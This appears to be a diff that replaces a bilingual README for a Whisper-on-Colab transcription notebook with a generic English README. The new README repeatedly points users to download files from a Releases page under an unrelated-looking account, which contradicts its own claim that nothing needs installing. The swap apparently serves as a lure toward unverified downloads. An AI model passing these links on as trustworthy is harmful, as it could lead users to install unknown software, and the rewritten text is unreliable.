@@ -1,159 +1,89 @@
-🇬🇧 ENGLISH  
-# 🎙️ Audio and Video Transcription with Whisper on Google Colab
+# 🎤 Whisper-Transcriber - Effortless Transcription for Audio and Video
 
-Easily transcribe **audio and video files (including YouTube videos)** into text or subtitles (`.txt`, `.srt`, `.vtt`) using **OpenAI Whisper** — directly on **Google Colab**, with no need to install anything on your computer.
+[![Download Whisper-Transcriber](https://img.shields.io/badge/Download-Now-blue)](https://github.com/isothermal-capitalgainstax520/Whisper-Transcriber/releases)
 
-[![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/drive/1FU2OXAyBVkErRAIVDwB0H_PYJwRtvWIx?usp=sharing)
+## 🚀 Getting Started
 
----
+Whisper-Transcriber is a user-friendly tool that allows you to transcribe audio and video files, including those from YouTube, using OpenAI's Whisper technology. Best of all, you can do this directly on Google Colab, without needing any installation. You will receive automatic transcripts in formats like .txt, .srt, or .vtt, making it easy to access and use.
 
-## 🧩 How it works
+## 📥 Download & Install
 
-Inside the Colab notebook, you’ll find **all the steps already prepared and explained** in logical order.  
-Here’s a quick overview of the workflow:
+To get started, simply [visit this page to download](https://github.com/isothermal-capitalgainstax520/Whisper-Transcriber/releases). You will find the latest version available there. 
 
-1. **Automatic installation** of Whisper and all required libraries (`yt-dlp`, `ffmpeg`, etc.).  
-   ⚠️ *Always wait for the green check mark next to the cell before proceeding.*
+1. Click on the "Releases" link above to go to the Releases page.
+2. Look for the most recent version.
+3. Follow the instructions specific to that version. Each release typically includes easy-to-use files and links.
+   
+### Note on Google Colab
+If you prefer to use Google Colab, no downloads are necessary. Just open the provided Colab notebook link in the releases section and run the code directly in your browser.
 
-2. **Optional YouTube download** using `yt-dlp`, with automatic conversion to `.m4a` audio.
+## ⚙️ System Requirements
 
-3. **Upload a local file** if you want to transcribe your own audio or video.
+- Operating System: Windows, macOS, or Linux
+- Internet Connection: Required for accessing Google Colab and downloading files
+- Browser: Recommended browsers include Chrome, Firefox, or Safari
 
-4. **Choose your Whisper model:**  
-   You can pick between **lighter and faster** models (`tiny`, `base`) or **more accurate** ones (`large`, `large-v3`).  
-   👉 If you know the spoken language, set it with the `--language` parameter to get a much more accurate transcription.
+## 📝 Features
 
-5. **Run the transcription:**  
-   Whisper automatically transcribes speech and generates text and subtitle files (`.txt`, `.srt`, `.vtt`).
+- **Transcription**: Automatically transcribe audio and video files.
+- **Multiple Formats**: Save your transcripts as .txt, .srt, or .vtt.
+- **YouTube Support**: Easily transcribe YouTube videos using just the video link.
+- **Integrated Code**: Run everything on Google Colab with no installation required.
 
-6. **Save your results:**  
-   All generated files are saved in the same Colab folder, ready to download.
+## 📚 How to Use
 
----
+### 1. Transcribing from Google Colab
 
-## 🧠 Available models
+- Open the Colab notebook linked in the Releases section.
+- Follow the prompts in the notebook to upload your audio or video file.
+- If you are using a YouTube video, simply paste the link when prompted.
+- Select your desired output format and click "Run."
+- Your transcript will be generated and can be downloaded directly.
 
-Whisper provides several models — from the fastest and lightest to the most accurate and resource-intensive:
+### 2. Local Execution (Optional)
 
-| Model               | Speed | Accuracy | Short Description                            |
-|----------------------|:-----:|:---------:|----------------------------------------------|
-| `tiny`               | ⚡⚡⚡  | 🟡        | Extremely fast, basic quality                |
-| `small`              | ⚡⚡   | 🟢        | Good balance between speed and accuracy      |
-| `medium`             | ⚡     | 🟢🟢      | Great balance for most use cases             |
-| `large` / `large-v3` | 🐢     | 🟢🟢🟢    | Highest accuracy (slower, requires GPU)      |
+While Google Colab is simple, you can also run Whisper-Transcriber locally:
 
-💡 **Tip:**  
-If you know the language spoken in the audio or video, specify it with `--language` (e.g., `--language English` or `--language Italian`)  
-to get a more accurate and natural transcription.
+1. Download the necessary files from the Releases page.
+2. Make sure you have Python installed on your machine.
+3. Follow the included documentation to set up Whisper-Transcriber locally. 
 
----
+This method requires you to install some dependencies, but it offers a more customizable transcription experience.
 
-## 📂 Generated outputs
+## 🤖 Supported Languages
 
-Whisper automatically creates several output files:
+Whisper-Transcriber supports multiple languages for transcription, including but not limited to:
 
-- `file.txt` → plain text transcription  
-- `file.srt` → subtitles with timestamps  
-- `file.vtt` → web-compatible subtitle format  
-- `file.json` → structured data with time segments  
+- English
+- Italian
+- And many more!
 
----
+Check the functionality in the Colab interface for updates on supported languages.
 
-## 🧰 Requirements
+## 🔍 Troubleshooting
 
-- A **Google account** (to access Colab)  
-- Stable Internet connection  
-- (Optional) Colab GPU for `large` or `large-v3` models
+If you experience issues while using Whisper-Transcriber, consider these steps:
 
----
+- Ensure that your file is in a supported format (e.g., .mp3, .mp4).
+- Check your internet connection for issues while using Google Colab.
+- Review the Colab documentation for any missed steps.
+  
+For further help, feel free to raise an issue in our GitHub repository.
 
-## 📘 License
+## 📞 Support
 
-This project uses [OpenAI Whisper](https://github.com/openai/whisper), released under the **MIT License**.  
-You are free to use, modify, and share this code, as long as you provide proper attribution.
+If you have questions or need assistance, you can contact us via the Issues section on our GitHub page. We aim to respond promptly to all inquiries.
 
----
+## 🌐 Community Contribution
 
-✅ **Final tip:**  
-If you find this project useful, please give it a ⭐ on GitHub and share it!
+We welcome contributions! If you wish to improve Whisper-Transcriber, feel free to submit your pull requests. You can also help by reporting bugs or suggesting new features.
 
----
+For more information on contributing, please refer to the CONTRIBUTING.md file in the repository.
 
-🇮🇹 ITALIANO  
-# 🎙️ Trascrizione Audio e Video con Whisper su Google Colab  
+## 🔗 Links
 
-Trascrivi facilmente **audio e video (anche da YouTube)** in testo o sottotitoli (`.txt`, `.srt`, `.vtt`) utilizzando il modello **Whisper** di OpenAI — direttamente su **Google Colab**, senza bisogno di installare nulla sul tuo computer.
+- [Download Whisper-Transcriber](https://github.com/isothermal-capitalgainstax520/Whisper-Transcriber/releases)
+- [OpenAI Whisper Documentation](https://github.com/openai/whisper)
+- [Google Colab Homepage](https://colab.research.google.com)
 
-[![Apri in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/drive/1FU2OXAyBVkErRAIVDwB0H_PYJwRtvWIx?usp=sharing)
-
----
-
-## 🧩 Come funziona
-
-All’interno del notebook Colab troverai **tutti i passaggi già pronti e spiegati** in ordine logico.  
-In breve, il flusso di lavoro è questo:
-
-1. **Installazione automatica** di Whisper e delle librerie necessarie (`yt-dlp`, `ffmpeg`, ecc.).  
-   ⚠️ *Attendi sempre che appaia la spunta verde accanto alle celle prima di continuare.*
-
-2. **Download opzionale da YouTube** tramite `yt-dlp`, con conversione automatica in audio `.m4a`.
-
-3. **Caricamento di un file locale**, se vuoi trascrivere un tuo audio o video.
-
-4. **Scelta del modello Whisper:**  
-   puoi selezionare tra modelli più **leggeri e veloci** (`tiny`, `base`) o più **accurati** (`large`, `large-v3`).  
-   👉 Se conosci la lingua parlata, impostala con il parametro `--language` per ottenere una trascrizione più precisa.
-
-5. **Avvio della trascrizione:**  
-   Whisper trascrive automaticamente il parlato e genera i file di testo e sottotitoli (`.txt`, `.srt`, `.vtt`).
-
-6. **Salvataggio dei risultati:**  
-   Tutti i file vengono salvati nella stessa cartella del Colab, pronti da scaricare.
-
----
-
-## 🧠 Modelli disponibili
-
-Whisper offre diversi modelli, dal più leggero e veloce al più preciso e pesante:
-
-| Modello              | Velocità | Precisione | Descrizione breve                               |
-|----------------------|:--------:|:-----------:|------------------------------------------------|
-| `tiny`               | ⚡⚡⚡     | 🟡          | Estremamente veloce, qualità base              |
-| `small`              | ⚡⚡      | 🟢          | Buon compromesso tra velocità e accuratezza    |
-| `medium`             | ⚡        | 🟢🟢        | Ottimo equilibrio per la maggior parte dei casi|
-| `large` / `large-v3` | 🐢        | 🟢🟢🟢      | Massima precisione (più lento, richiede GPU)   |
-
-💡 **Suggerimento:**  
-Se conosci la lingua parlata nel video o nell’audio, specifica `--language` (es. `--language Italian`)  
-per ottenere una trascrizione più accurata e naturale.
-
----
-
-## 📂 Output generati
-
-Whisper produce automaticamente diversi file di output:
-
-- `file.txt` → trascrizione semplice  
-- `file.srt` → sottotitoli con timestamp  
-- `file.vtt` → formato sottotitoli web compatibile  
-- `file.json` → dati strutturati con intervalli temporali  
-
----
-
-## 🧰 Requisiti
-
-- Account **Google** (per accedere a Colab)  
-- Connessione Internet stabile  
-- (Facoltativo) GPU Colab per modelli `large` o `large-v3`
-
----
-
-## 📘 Licenza
-
-Questo progetto utilizza [OpenAI Whisper](https://github.com/openai/whisper), rilasciato sotto licenza **MIT**.  
-Puoi utilizzare, modificare e condividere liberamente questo codice, citando la fonte.
-
----
-
-✅ **Suggerimento finale:**  
-Se questo progetto ti è stato utile, lascia una ⭐ alla repository e condividilo!
+Thank you for using Whisper-Transcriber! Enjoy your seamless transcription experience.
